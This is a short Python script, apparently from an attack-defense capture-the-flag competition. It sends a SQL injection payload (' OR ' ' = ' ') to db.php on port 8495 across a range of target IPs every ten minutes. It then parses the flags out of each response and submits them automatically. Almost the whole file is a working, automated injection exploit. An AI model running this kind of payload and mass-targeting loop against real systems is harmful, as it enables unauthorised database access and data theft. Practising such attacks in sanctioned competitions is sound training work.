from attack import *
from attack_targets import ip_range, Target
from EsseSubmitter import EsseSubmitter
import requests
from xml.etree import ElementTree

ips = ip_range(10, 10, 40, 101, 132)
ips = [ip for ip in ips if ip != "10.10.40.108"]
targets = [Target(ip, 8495) for ip in ips]



@local
@every(minutes=10, seconds=0)
@attack(targets)
@submit(EsseSubmitter)
def exploit(target: Target):
    flags = []
    url = f"https://{target.get_host_str()}/db.php?mepoc=%27%20OR%20%27%20%27%20=%20%27%20"
    response = requests.get(url, verify=False)

    lines = response.text.splitlines()
    for l in lines:
        s = l.split(";")
        if len(s) > 1:
            flags.append(l.split(";")[1])

    return flags
